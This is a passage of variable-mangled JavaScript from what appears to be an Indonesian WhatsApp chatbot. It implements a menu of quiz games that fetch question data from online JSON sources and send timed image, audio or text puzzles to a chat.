                    'id': ".tebakgambar"
                  }, {
                    'header': "🚩 Tebak Bendera",
                    'title': "Tebak bendera negara di dunia!",
                    'id': ".tebakbendera"
                  }]
                }, {
                  'title': "📝 Tebakan Kreatif",
                  'rows': [{
                    'header': "✍️ Lengkapi Kalimat",
                    'title': "Lengkapi kalimat yang belum selesai!",
                    'id': ".lengkapikalimat"
                  }, {
                    'header': "🧠 Asah Otak",
                    'title': "Soal-soal yang mengasah logika!",
                    'id': '.asahotak'
                  }, {
                    'header': "🔤 Tebak Kata",
                    'title': "Cari kata yang tersembunyi!",
                    'id': ".tebakkata"
                  }, {
                    'header': "💭 Tebak TTS",
                    'title': "Tebak teka-teki silang seru!",
                    'id': '.tebaktebakan'
                  }, {
                    'header': "🎶 Tebak Lirik",
                    'title': "Lengkapi lirik lagu yang hilang!",
                    'id': ".tebaklirik"
                  }, {
                    'header': "🧪 Tebak Kimia",
                    'title': "Uji pengetahuanmu tentang kimia!",
                    'id': '.tebakkimia'
                  }, {
                    'header': "❓ Tebak Siapa",
                    'title': "Tebak nama orang dari petunjuk!",
                    'id': '.tebaksiapa'
                  }, {
                    'header': "📝 Tebak Kalimat",
                    'title': "Tebak arti dari sebuah kalimat!",
                    'id': ".tebakkalimat"
                  }]
                }]
              })
            }];
            let _0x2970d2 = "*🎮 Pilih Game yang Mau Dimainkan!*\n\n";
            _0x2970d2 += "Pilih game dari daftar berikut ini untuk memulai! Klik tombol di bawah ya!\n\n";
            _0x2970d2 += "_*Selamat bermain dan semoga menyenangkan!*_";
            await _0x59f5fa.sendButtonText(_0x3f87c6.chat, _0x20427c, _0x2970d2, "Pilih Game", _0x3f87c6);
          } catch (_0x5a2546) {
            console.error(_0x5a2546);
            _0x3a091f("⚠️ Terjadi kesalahan: " + _0x5a2546.message);
          }
          break;
        }
        case 'tebakgambar':
  {
    const sesi = await _0x27e2d1(_0x3f87c6.chat);
    if (sesi) return _0x3a091f("Masih ada sesi yang belum selesai!");

    if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 1) {
      return _0x3a091f(mess.limit);
    }

    try {
      let _0x3eaa72 = await fetchJson("https://raw.githubusercontent.com/KoKoRey1337/darkroom-db/main/tebakgambar.json");

      if (!_0x3eaa72 || !Array.isArray(_0x3eaa72)) {
        return _0x3a091f("❗ Gagal memuat soal. Database tidak valid.");
      }

      let soal = _0x3eaa72[Math.floor(Math.random() * _0x3eaa72.length)];

      if (!soal || !soal.jawaban || !soal.img) {
        return _0x3a091f("❗ Soal tidak valid. Coba lagi.");
      }

      console.log("Jawaban: " + soal.jawaban);

      let kirim = await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
        image: { url: soal.img },
        caption:
          "🧠 *Tebak Gambar!*\n\nDeskripsi: " + soal.deskripsi +
          "\nWaktu: 120 detik\n\n_Ketik .nyerah untuk menyerah_\n_Ketik .bantuan untuk petunjuk_"
      }, { quoted: _0x3f87c6 });

      tebakgambar[_0x3f87c6.chat] = [
        kirim,
        soal,
        0xfa,
        setTimeout(() => {
          if (tebakgambar[_0x3f87c6.chat]) {
            _0x5eb3bb(soal.jawaban);
            delete tebakgambar[_0x3f87c6.chat];
          }
        }, 120000)
      ];

    } catch (err) {
      console.error(err);
      _0x3a091f("*Gagal memuat database dari server*. ☹️");
    }
  }
  break;
      case "tebakgame":
        {
          const _0x56249d = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x56249d) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x5d6894 = await fetchJson("https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json");
            let _0x1aa22b = await _0x5d6894[Math.floor(Math.random() * _0x5d6894.length)];
            console.log("Jawaban: " + _0x1aa22b.jawaban);
            tebakgame[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x1aa22b.img
              },
              'caption': "Gambar diatas adalah game?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x1aa22b, 0xfa, setTimeout(() => {
              if (tebakgame[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x1aa22b.jawaban);
                delete tebakgame[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x408409) {
            console.log(_0x408409);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakhero":
        {
          const _0x1f7c62 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x1f7c62) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x2acf2b = await fetchJson('https://api.siputzx.my.id/api/games/tebakheroml');
            let _0x685d36 = _0x2acf2b.data;
            console.log("Jawaban: " + _0x685d36.name);
            tebakhero[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'audio': {
                'url': _0x685d36.audio
              },
              'caption': "Silahkan Tebak Hero Berdasarkan Audio Ini\n\nWaktu: " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x685d36, 0xfa, setTimeout(() => {
              if (tebakhero[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x685d36.name);
                delete tebakhero[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x2bb231) {
            console.log(_0x2bb231);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
        }
        break;
      case "tebakff":
        {
          const _0x2c9de2 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x2c9de2) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x2b164f = await fetchJson("https://api.siputzx.my.id/api/games/karakter-freefire");
            let _0x70e6eb = _0x2b164f.data;
            console.log("Jawaban: " + _0x70e6eb.name);
            tebakff[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x70e6eb.gambar
              },
              'caption': "Siapa nama karakter yang ada pada gambar diatas?\n\nWaktu: " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x70e6eb, 0xfa, setTimeout(() => {
              if (tebakff[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x70e6eb.jawaban);
                delete tebakff[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x473bc4) {
            console.log(_0x473bc4);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
        }
        break;
      case "tebakkabupaten":
        {
          const _0x56cd38 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x56cd38) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x374e89 = await fetchJson("https://api.siputzx.my.id/api/games/kabupaten");
            console.log("Jawaban: " + _0x374e89.title);
            tebakkabupaten[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x374e89.url
              },
              'caption': "Logo Kabupaten Manakah ini?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x374e89, 0xfa, setTimeout(() => {
              if (tebakkabupaten[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x374e89.title);
                delete tebakkabupaten[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x4c51bd) {
            console.log(_0x4c51bd);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case 'tebakjkt48':
        {
          const _0x1d6aac = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x1d6aac) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x40a7b1 = await fetchJson("https://api.siputzx.my.id/api/games/tebakjkt");
            console.log("Jawaban: " + _0x40a7b1.jawaban);
            tebakjkt48[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x40a7b1.img
              },
              'caption': "Siapakah Nama Member JKT48 Ini?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x40a7b1, 0xfa, setTimeout(() => {
              if (tebakjkt48[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x40a7b1.name);
                delete tebakjkt48[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x5762c4) {
            console.log(_0x5762c4);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakhewan":
        {
          const _0x35ffa0 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x35ffa0) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x24902e = await fetchJson("https://api.siputzx.my.id/api/games/tebakhewan");
            let _0xf529a4 = await _0x24902e[Math.floor(Math.random() * _0x24902e.length)];
            console.log("Jawaban: " + _0xf529a4.title);
            tebakhewan[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0xf529a4.url
              },
              'caption': "Hewan Apakah Ini?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0xf529a4, 0xfa, setTimeout(() => {
              if (tebakhewan[_0x3f87c6.chat]) {
                _0x5eb3bb(_0xf529a4.title);
                delete tebakhewan[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x10b19c) {
            console.log(_0x10b19c);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakanime":
      case "tebakchara":
        {
          const _0x1d84e3 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x1d84e3) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x1675a9 = await fetchJson("https://www.sock.my.id/cdn/game/characters.json");
            let _0x17f10a = _0x1675a9.data;
            let _0x1633a5 = await _0x17f10a[Math.floor(Math.random() * _0x17f10a.length)];
            console.log("Jawaban: " + _0x1633a5.name);
            tebakchara[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x1633a5.images.jpg.image_url
              },
              'caption': "Siapakah Nama Karakter Ini?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x1633a5, 0xfa, setTimeout(() => {
              if (tebakchara[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x1633a5.name);
                delete tebakchara[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x56915a) {
            console.log(_0x56915a);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebaklogo":
        {
          const _0x3feafc = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x3feafc) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x4ad6e5 = await fetchJson("https://www.sock.my.id/cdn/game/tebaklogo.json");
            let _0x346c6c = await _0x4ad6e5[Math.floor(Math.random() * _0x4ad6e5.length)];
            console.log("Jawaban: " + _0x346c6c.jawaban);
            tebaklogo[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x346c6c.img
              },
              'caption': "*Logo Apa Ini?*\n\n" + _0x346c6c.deskripsi + "\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x346c6c, 0xfa, setTimeout(() => {
              if (tebaklogo[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x346c6c.jawaban);
                delete tebaklogo[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x3dca2a) {
            console.log(_0x3dca2a);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakaplikasi":
        {
          const _0x4b06a5 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x4b06a5) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x58b305 = await fetchJson("https://www.sock.my.id/cdn/game/tebakaplikasi.json");
            let _0x5643d5 = await _0x58b305[Math.floor(Math.random() * _0x58b305.length)];
            console.log("Jawaban: " + _0x5643d5.jawaban);
            tebakaplikasi[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x5643d5.image
              },
              'caption': "Gambar diatas adalah aplikasi?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x5643d5, 0xfa, setTimeout(() => {
              if (tebakaplikasi[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x5643d5.jawaban);
                delete tebakaplikasi[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x2b7bd4) {
            console.log(_0x2b7bd4);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakkata":
        {
          const _0x5a52c7 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x5a52c7) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x4ec6b3 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/tebakkata.json");
            let _0x1920c2 = await _0x4ec6b3[Math.floor(Math.random() * _0x4ec6b3.length)];
            console.log("Jawaban: " + _0x1920c2.jawaban);
            tebakkata[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x1920c2.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x1920c2, 0xfa, setTimeout(() => {
              if (tebakkata[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x1920c2.jawaban);
                delete tebakkata[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x5a6fb1) {
            console.log(_0x5a6fb1);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case 'asahotak':
        {
          const _0x268769 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x268769) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x6a62ad = await fetchJson('https://www.sock.my.id/cdn/game/asahotak.json');
            let _0x5f2516 = await _0x6a62ad[Math.floor(Math.random() * _0x6a62ad.length)];
            console.log("Jawaban: " + _0x5f2516.jawaban);
            asahotak[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x5f2516.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x5f2516, 0xfa, setTimeout(() => {
              if (asahotak[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x5f2516.jawaban);
                delete asahotak[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x4c6b01) {
            console.log(_0x4c6b01);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "lengkapikalimat":
        {
          const _0x47ca62 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x47ca62) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x2312ed = await fetchJson("https://www.sock.my.id/cdn/game/lengkapikalimat.json");
            let _0x1db57b = await _0x2312ed[Math.floor(Math.random() * _0x2312ed.length)];
            console.log("Jawaban: " + _0x1db57b.jawaban);
            lengkapikalimat[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x1db57b.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x1db57b, 0xfa, setTimeout(() => {
              if (lengkapikalimat[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x1db57b.jawaban);
                delete lengkapikalimat[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x191a63) {
            console.log(_0x191a63);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakbendera":
        {
          const _0x1e8d89 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x1e8d89) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x5d73d5 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/tebakbendera2.json");
            let _0x4cbcbc = await _0x5d73d5[Math.floor(Math.random() * _0x5d73d5.length)];
            console.log("Jawaban: " + _0x4cbcbc.name);
            tebakbendera[_0x3f87c6.chat] = [await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'image': {
                'url': _0x4cbcbc.img
              },
              'caption': "Gambar diatas adalah bendera negara?\n\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._"
            }, {
              'quoted': _0x3f87c6
            }), _0x4cbcbc, 0xfa, setTimeout(() => {
              if (tebakbendera[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x4cbcbc.name);
                delete tebakbendera[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x7d3cc1) {
            console.log(_0x7d3cc1);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebakkalimat":
        {
          const _0x1a7c1d = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x1a7c1d) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x11166c = await fetchJson('https://raw.githubusercontent.com/RyzenOfc/games/master/tebakkalimat.json');
            let _0x5cede8 = await _0x11166c[Math.floor(Math.random() * _0x11166c.length)];
            console.log("Jawaban: " + _0x5cede8.jawaban);
            tebakkalimat[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x5cede8.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x5cede8, 0xfa, setTimeout(() => {
              if (tebakkalimat[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x5cede8.jawaban);
                delete tebakkalimat[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x4e0d3e) {
            console.log(_0x4e0d3e);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebaksiapa":
        {
          const _0x5e176a = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x5e176a) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x39a979 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/siapakahaku.json");
            let _0x12e606 = await _0x39a979[Math.floor(Math.random() * _0x39a979.length)];
            console.log("Jawaban: " + _0x12e606.jawaban);
            siapaaku[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x12e606.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x12e606, 0xfa, setTimeout(() => {
              if (siapaaku[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x12e606.jawaban);
                delete siapaaku[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x3d9837) {
            console.log(_0x3d9837);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case 'tebakkimia':
        {
          const _0x282052 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x282052) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x4896b5 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/tebakkimia.json");
            let _0xa8e90c = await _0x4896b5[Math.floor(Math.random() * _0x4896b5.length)];
            console.log("Jawaban: " + _0xa8e90c.unsur);
            tebakkimia[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Apa Arti Dari Simbol : *" + _0xa8e90c.lambang + "*?\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0xa8e90c, 0xfa, setTimeout(() => {
              if (tebakkimia[_0x3f87c6.chat]) {
                _0x5eb3bb(_0xa8e90c.unsur);
                delete tebakkimia[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x454852) {
            console.log(_0x454852);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebaklirik":
        {
          const _0x245ec2 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x245ec2) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x2df550 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/tebaklirik.json");
            let _0x4a7e1f = await _0x2df550[Math.floor(Math.random() * _0x2df550.length)];
            console.log("Jawaban: " + _0x4a7e1f.jawaban);
            tebaklirik[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Ini Adalah Lirik Dari Lagu? : *" + _0x4a7e1f.soal + "*?\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x4a7e1f, 0xfa, setTimeout(() => {
              if (tebaklirik[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x4a7e1f.jawaban);
                delete tebaklirik[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x5395d5) {
            console.log(_0x5395d5);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "tebaktebakan":
        {
          const _0x51d289 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x51d289) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x303d00 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/tebaktebakan.json");
            let _0x5f3e74 = await _0x303d00[Math.floor(Math.random() * _0x303d00.length)];
            console.log("Jawaban: " + _0x5f3e74.jawaban);
            tebaktebakan[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x5f3e74.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x5f3e74, 0xfa, setTimeout(() => {
              if (tebaktebakan[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x5f3e74.jawaban);
                delete tebaktebakan[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x1fed5b) {
            console.log(_0x1fed5b);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "susunkata":
        {
          const _0x43f30f = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x43f30f) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x41b360 = await fetchJson("https://raw.githubusercontent.com/KoKoRey1337/darkroom-db/main/susunkata.json");
            let _0x2fee30 = await _0x41b360[Math.floor(Math.random() * _0x41b360.length)];
            console.log("Jawaban: " + _0x2fee30.jawaban);
            susunkata[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "*Jawablah Pertanyaan Berikut :*\nSoal : " + _0x2fee30.soal + "\nTipe : " + _0x2fee30.tipe + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x2fee30, 0xfa, setTimeout(() => {
              if (susunkata[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x2fee30.jawaban);
                delete susunkata[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x45d369) {
            console.log(_0x45d369);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "caklontong":
        {
          const _0x9dd8c5 = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x9dd8c5) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x594434 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/caklontong.json");
            let _0xd370f2 = await _0x594434[Math.floor(Math.random() * _0x594434.length)];
            console.log("Jawaban: " + _0xd370f2.jawaban);
            caklontong[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "*Jawablah Pertanyaan Berikut :*\nSoal : " + _0xd370f2.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0xd370f2, 0xfa, setTimeout(() => {
              if (caklontong[_0x3f87c6.chat]) {
                _0x5eb3bb(_0xd370f2.jawaban);
                delete caklontong[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x49380e) {
            console.log(_0x49380e);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case 'tekateki':
        {
          const _0x42005c = await _0x27e2d1(_0x3f87c6.chat);
          if (_0x42005c) {
            return _0x3a091f("Masih ada sesi yang belum selesai!");
          }
          if (!_0x256404 && db.data.users[_0x3f87c6.sender].limit < 0x1) {
            return _0x3a091f(mess.limit);
          }
          try {
            let _0x106739 = await fetchJson("https://raw.githubusercontent.com/RyzenOfc/games/master/tekateki.json");
            let _0x5c3eaf = await _0x106739[Math.floor(Math.random() * _0x106739.length)];
            console.log("Jawaban: " + _0x5c3eaf.jawaban);
            tekateki[_0x3f87c6.chat] = [await _0x59f5fa.sendText(_0x3f87c6.chat, "Silahkan Jawab Pertanyaan Berikut\n\n" + _0x5c3eaf.soal + "\nWaktu : " + 120 .toFixed(0x2) + " detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._", _0x3f87c6), _0x5c3eaf, 0xfa, setTimeout(() => {
